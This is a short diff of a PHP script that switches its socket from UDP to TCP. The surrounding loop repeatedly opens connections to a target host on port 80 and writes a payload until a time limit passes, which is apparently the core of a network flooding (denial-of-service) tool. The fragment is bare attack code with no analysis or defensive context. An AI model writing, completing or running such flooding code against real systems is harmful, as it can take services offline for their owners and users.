@@ -16,7 +16,7 @@ if(time() > $max_time){
 break;
 }
 $rand = rand(1,65553);
-$fp = fsockopen('udp://'.$host, 80, $errno, $errstr, 30);
+$fp = fsockopen('tcp://'.$host, 80, $errno, $errstr, 30);
 if($fp){
 fwrite($fp, $out);
 fclose($fp);
